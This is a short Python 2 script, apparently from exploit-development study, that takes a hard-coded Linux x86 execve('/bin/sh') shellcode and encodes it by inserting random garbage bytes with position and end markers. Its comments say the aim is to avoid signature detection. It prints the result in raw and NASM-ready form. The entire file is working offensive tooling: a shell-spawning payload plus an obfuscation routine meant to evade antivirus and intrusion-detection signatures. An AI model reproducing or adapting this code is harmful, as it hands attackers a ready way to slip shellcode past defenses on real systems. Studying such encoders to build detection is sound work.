#!/usr/bin/python
'''
 Custom Shellcode Encoder
 Author Liviu I. 

 License http://creativecommons.org/licenses/by-sa/3.0/
 Legitimate use and research only
 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE

'''

import random

# Execve-stack shellcode - execve(/bin/sh,..)
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

'''
Add random instructions to the shellcode to avoid signature detection

--------------------------------------------------------
| n0 | . . .| b1 | n1 | . . . . .| b2 | n2 | . . . |END |
--------------------------------------------------------

ni  - next garbage byte position
bi  - garbage byte 
END - END of the shellcode marker

'''

encoded = ""

idx = 1

# Control  the frequency of garbage through a displacement
MIN_DEP = 3     # min number of shellcode bytes after which to inject garbage
MAX_DEP = 4     # max ...
dep = random.randint(MIN_DEP, MAX_DEP)
n = idx + dep
encoded += '\\x%02x' % n
END = "\\xf0\\x0d"

for x in bytearray(shellcode) :
    if idx == n: 
        # We have reached an insertion point
        dep = random.randint(MIN_DEP, MAX_DEP)
        n = idx + dep

        encoded += '\\x%02x' % random.randint(1,255)
        encoded += '\\x%02x' % n
        idx += 2
    
    # Add a shellcode byte
    encoded += '\\x%02x' % x
    idx += 1

encoded += END

print encoded
# Print in nasm friendly form
print encoded.replace("\\x", ",0x")[1:]

print 'Initial len: %d, encoded len: %d' % (len(shellcode), 
    len(encoded)/4)
